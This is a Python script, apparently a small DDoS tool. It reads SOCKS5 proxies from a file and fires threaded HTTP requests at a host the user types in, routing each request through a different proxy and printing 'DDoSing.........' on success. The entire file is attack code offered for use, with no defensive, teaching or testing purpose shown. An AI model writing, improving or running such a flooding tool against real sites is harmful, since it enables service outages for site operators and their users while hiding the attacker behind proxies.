import socket
import socks
import threading
import requests
import time
import os

import colorama
from colorama import Fore
from colorama import Style

colorama.init()

os.system('cls')

url = input("Host : ")

with open('socks5.txt', 'r') as f:
    sock_list = f.read().splitlines()

def response_http_socks(socks_address, socks_port):
    session = requests.Session()

    socks.set_default_proxy(socks.SOCKS5, socks_address, int(socks_port))
    socket.socket = socks.socksocket

    response = requests.get(url)
    if response.status_code == 200:
        print(Fore.BLUE + Style.BRIGHT + " DDoSing.........")
    else:
        print(Fore.YELLOW + Style.BRIGHT + "Server May Be DOWN....")

threads = []

for socks_address in sock_list:
    socks_address, socks_port = socks_address.split(':')

    t = threading.Thread(target=response_http_socks, args=(socks_address,socks_port))

    threads.append(t)

start_time = time.time()
for t in threads:
    t.start()

for t in threads:
    t.join()

end_time = time.time()
elapsed_time = end_time - start_time
print(f"elapsed_time for 1000 requests")
